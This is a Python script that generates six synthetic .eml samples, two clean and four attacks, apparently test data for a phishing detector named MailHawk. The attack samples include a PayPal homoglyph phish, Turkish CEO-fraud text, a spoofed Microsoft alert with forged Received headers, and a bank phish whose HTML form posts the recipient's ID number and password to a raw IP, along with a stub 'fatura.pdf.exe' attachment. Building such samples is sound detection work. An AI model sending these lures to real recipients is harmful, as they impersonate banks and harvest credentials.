#!/usr/bin/env python3
"""
demo_gen.py — build six synthetic .eml files for MailHawk.

Two clean messages (personal mail, ESP newsletter) and four attacks
(brand homoglyph phish, BEC CEO fraud, forged-header brand spoof,
Turkish bank phish with weaponized attachment). Everything is synthetic;
no real infrastructure is contacted.
"""

import os
import sys
from email.message import EmailMessage
from email.utils import format_datetime
from datetime import datetime, timezone, timedelta

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "demo")

TZ = timezone(timedelta(hours=3))  # İstanbul


def dt(minute):
    return format_datetime(datetime(2026, 11, 12, 9, minute, 0, tzinfo=TZ))


def base(from_, to, subject, date_min=0):
    m = EmailMessage()
    m["From"] = from_
    m["To"] = to
    m["Subject"] = subject
    m["Date"] = dt(date_min)
    return m


def hop(helo, ip, by, minute, proto="ESMTPS"):
    return (f"from {helo} ({helo} [{ip}]) by {by} with {proto} id "
            f"a1b2c3{minute:02d}; {dt(minute)}")


def save(m, name, planted):
    path = os.path.join(OUT, name)
    with open(path, "wb") as fh:
        fh.write(bytes(m))
    print(f"  ✔ {name:<28} planted: {planted}")


def main():
    os.makedirs(OUT, exist_ok=True)
    print(f"MailHawk demo generator → {OUT}\n")

    # 1 ── clean personal mail (gmail → mustafa) --------------------------
    m = base('"Elif Kaya" <elif.kaya@gmail.com>',
             '"Mustafa AK" <mustafa@mustafaak0.dev>',
             "Re: project files", 30)
    m["Message-ID"] = "<CAL7x8Q@mail.gmail.com>"
    m["Authentication-Results"] = (
        "mx.mustafaak0.dev; spf=pass (gmail.com: domain of "
        "elif.kaya@gmail.com designates 209.85.220.41 as permitted sender) "
        "smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d="
        "gmail.com header.i=@gmail.com; dmarc=pass (p=NONE dis=NONE) "
        "header.from=gmail.com")
    m["Received"] = hop("mx.mustafaak0.dev", "203.0.113.10",
                        "imap.mustafaak0.dev", 32)          # newest (top)
    m["Received"] = hop("mail-sor-f41.google.com", "209.85.220.41",
                        "mx.mustafaak0.dev", 31)             # origin (bottom)
    m.set_content("Selam Mustafa,\n\nDosyalar hazır, ekteki linkten "
                  "indirebilirsin.\n\nİyi çalışmalar,\nElif")
    save(m, "01_legit_personal.eml",
         "nothing — SPF/DKIM/DMARC pass, consistent headers")

    # 2 ── clean ESP newsletter (SendGrid) ---------------------------------
    m = base('"ShopNest Weekly" <news@shopnest.io>',
             '"Mustafa AK" <mustafa@mustafaak0.dev>',
             "Your weekly digest ✨", 0)
    m["Message-ID"] = "<digest.2026.46.b9f@mail.shopnest.io>"
    m["Return-Path"] = "<bounces+em2356.3a1@em2356.shopnest.sendgrid.net>"
    m["List-Unsubscribe"] = "<https://shopnest.io/unsub>, <mailto:unsub@shopnest.io>"
    m["X-Mailer"] = "SendGrid Marketing Campaigns 10.2"
    m["Authentication-Results"] = (
        "mx.mustafaak0.dev; spf=pass (sendgrid.net: domain of "
        "em2356.shopnest.sendgrid.net designates 167.89.18.11 as permitted "
        "sender) smtp.mailfrom=em2356.shopnest.sendgrid.net; "
        "dkim=pass (1024-bit key) header.d=shopnest.io header.i=@shopnest.io;"
        " dmarc=pass (p=REJECT dis=NONE) header.from=shopnest.io")
    m["DKIM-Signature"] = ("v=1; a=rsa-sha256; d=shopnest.io; s=s1; c=relaxed/"
                           "relaxed; h=from:subject:to; b=Ym9ndXMK")
    m["Received"] = hop("mx.mustafaak0.dev", "203.0.113.10",
                        "imap.mustafaak0.dev", 2)           # newest (top)
    m["Received"] = hop("o1.mail.shopnest.sendgrid.net", "167.89.18.11",
                        "mx.mustafaak0.dev", 1)             # origin (bottom)
    m.set_content("Your weekly digest.")
    m.add_alternative(
        "<html><body><p>Merhaba Mustafa,</p>"
        "<p>Bu hafta öne çıkanlar: <a href=\"https://shopnest.io/deals\">"
        "ShopNest fırsatları</a></p>"
        "<p><a href=\"https://shopnest.io/unsub\">abonelikten çık</a></p>"
        "</body></html>", subtype="html")
    save(m, "02_legit_newsletter.eml",
         "nothing — signed ESP relay, List-Unsubscribe, aligned DKIM")

    # 3 ── PayPal homoglyph phish ------------------------------------------
    m = base('"PayPal Security" <service@paypa1-secure.com>',
             '"Mustafa AK" <mustafa@mustafaak0.dev>',
             "Urgent: your account has been suspended - verify now", 45)
    m["Reply-To"] = "<paypal.verify.team@gmail.com>"
    m["X-Mailer"] = "PHPMailer 6.8 (https://github.com/PHPMailer/PHPMailer)"
    m["Authentication-Results"] = (
        "mx.mustafaak0.dev; spf=fail (domain of paypa1-secure.com does "
        "not designate 185.199.108.153 as permitted sender) "
        "smtp.mailfrom=paypa1-secure.com; dkim=none (no key published); "
        "dmarc=fail (p=NONE dis=NONE) header.from=paypa1-secure.com")
    # injected header: the TOP hop claims a time BEFORE the origin below it
    m["Received"] = hop("mx.mustafaak0.dev", "203.0.113.10",
                        "imap.mustafaak0.dev", 12)   # top claims 09:12 …
    m["Received"] = hop("vps-993.hostwinds.xyz", "185.199.108.153",
                        "mx.mustafaak0.dev", 44)     # … but origin says 09:44
    m.set_content("Verify your account.")
    m.add_alternative(
        "<html><body><p>Dear Customer,</p>"
        "<p>Your account has been <b>limited</b>. To restore access, sign in:"
        "</p><p><a href=\"http://185.199.108.153/paypal/login\">"
        "https://www.paypal.com/login</a></p>"
        "</body></html>", subtype="html")
    save(m, "03_phish_paypal.eml",
         "homoglyph domain + brand display name + free-mail Reply-To + "
         "SPF fail + DMARC fail + deceptive link→raw IP + backwards "
         "Received time + PHP mailer")

    # 4 ── BEC / CEO fraud (Turkish) ----------------------------------------
    m = base('"Ahmet Yılmaz — CFO" <a.yilmaz@akbank-grup.com>',
             '"Mustafa AK" <mustafa@mustafaak0.dev>',
             "ACİL: havale onayı - hemen dönüş", 10)
    m["Reply-To"] = "<ayilmaz.cfo.private@yandex.com>"
    m["X-Mailer"] = "PHP mail() 8.2"
    # no Message-ID on purpose (scripted sender)
    m["Received"] = hop("mail.akbank-grup.com", "45.155.205.233",
                        "mx.mustafaak0.dev", 11)
    m.set_content("Mustafa Bey,\n\nTedarikçi ödemesi için acil havale "
                  "gerekli. IBAN'ı daha sonra ileteceğim.\n\nAhmet Yılmaz")
    save(m, "04_bec_ceo_fraud.eml",
         "brand-token domain (akbank-grup) + free-mail Reply-To + TR urgency "
         "subject + missing Message-ID + PHP mailer")

    # 5 ── forged-header brand spoof ----------------------------------------
    m = base('"Microsoft Account Team" <account-security-noreply@microsoft.com>',
             '"Mustafa AK" <mustafa@mustafaak0.dev>',
             "Security alert: unusual sign-in detected", 5)
    m["Message-ID"] = "<msa.9f3c@wierd-mailer.local>"
    # no Authentication-Results, no DKIM-Signature at all
    m["Received"] = hop("outlook-olive2.microsoft.com", "203.0.113.77",
                        "mx.mustafaak0.dev", 3)     # newer on top…
    m["Received"] = hop("DESKTOP-AK4712.home", "192.168.1.66",
                        "mail-relay.local", 21)     # …older below = backwards
    m.set_content("Unusual sign-in detected. Review your recent activity.")
    save(m, "05_forged_headers.eml",
         "real brand domain with ZERO auth results + private-IP origin + "
         "backwards Received chain + off-domain Message-ID")

    # 6 ── Turkish bank phish with weaponized attachment ---------------------
    m = base('"Garanti BBVA Müşteri Hizmetleri" <no-reply@garantibbva-guvenlik.xyz>',
             '"Mustafa AK" <mustafa@mustafaak0.dev>',
             "Hesabınız askıya alındı - hemen doğrulama yapın", 50)
    m["Authentication-Results"] = (
        "mx.mustafaak0.dev; spf=softfail (domain of transitioning "
        "garantibbva-guvenlik.xyz discourages 185.220.101.4) "
        "smtp.mailfrom=garantibbva-guvenlik.xyz; dkim=none; "
        "dmarc=none (p=NONE dis=NONE) header.from=garantibbva-guvenlik.xyz")
    m["Received"] = hop("srv-guvenlik.garantibbva-guvenlik.xyz", "185.220.101.4",
                        "mx.mustafaak0.dev", 51)
    m.set_content("Hesabınızı doğrulayın.")
    m.add_alternative(
        "<html><body><p>Sayın Müşterimiz,</p>"
        "<p>Hesabınız askıya alınmıştır. Doğrulama için giriş yapın:</p>"
        "<form action=\"http://185.220.101.4/giris\" method=\"POST\">"
        "TCKN: <input name=\"t\"><br>Şifre: <input name=\"p\" type=\"password\">"
        "<button>Doğrula</button></form>"
        "<p><a href=\"http://185.220.101.4/giris\">www.garantibbva.com.tr</a></p>"
        "</body></html>", subtype="html")
    m.add_attachment(
        b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff fake payload",
        maintype="application", subtype="octet-stream",
        filename="fatura.pdf.exe")
    save(m, "06_turkish_bank_phish.eml",
         "brand display name + hyphen lookalike .xyz domain + SPF softfail + "
         "embedded credential form + link text≠href + fatura.pdf.exe")

    print("\nNow hunt them:\n  python mailhawk.py demo/ -v")
    return 0


if __name__ == "__main__":
    sys.exit(main())
